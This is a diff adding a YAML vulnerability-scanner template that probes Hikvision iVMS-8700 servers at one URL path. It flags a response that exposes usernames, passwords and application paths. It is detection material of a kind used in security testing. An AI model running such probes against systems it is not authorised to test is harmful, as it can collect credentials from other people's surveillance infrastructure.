@@ -1,0 +1,25 @@
+id: hikvision-ivms8700-query-infoleak
+
+info:
+  name: hikvision-ivms8700-query-infoleak
+  author: sec
+  severity: high
+  tags: hikvision
+
+http:
+  - raw:   
+      - |
+        GET /gisplatform/hikgis/query.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "password")'
+          - 'status_code == 200'
+          - 'contains(body, "appPath")'
+          - 'contains(body, "username")'
+        condition: and
+
